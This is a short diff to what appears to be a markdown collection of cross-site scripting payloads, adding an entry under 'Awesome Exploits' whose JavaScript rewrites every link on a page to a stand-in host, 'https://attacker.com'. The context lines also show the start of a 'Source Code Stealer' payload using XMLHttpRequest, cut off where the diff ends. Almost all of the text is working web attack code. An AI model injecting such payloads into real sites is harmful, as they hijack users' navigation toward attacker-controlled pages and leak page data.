@@ -122,6 +122,12 @@ new class extends confirm``{}
 ```
 
 ### Awesome Exploits
+##### Replace all links
+```javascript
+Array.from(document.getElementsByTagName("a")).forEach(function(i) {
+  i.href = "https://attacker.com";
+});
+```
 ##### Source Code Stealer
 ```javascript
 var request = new XMLHttpRequest();
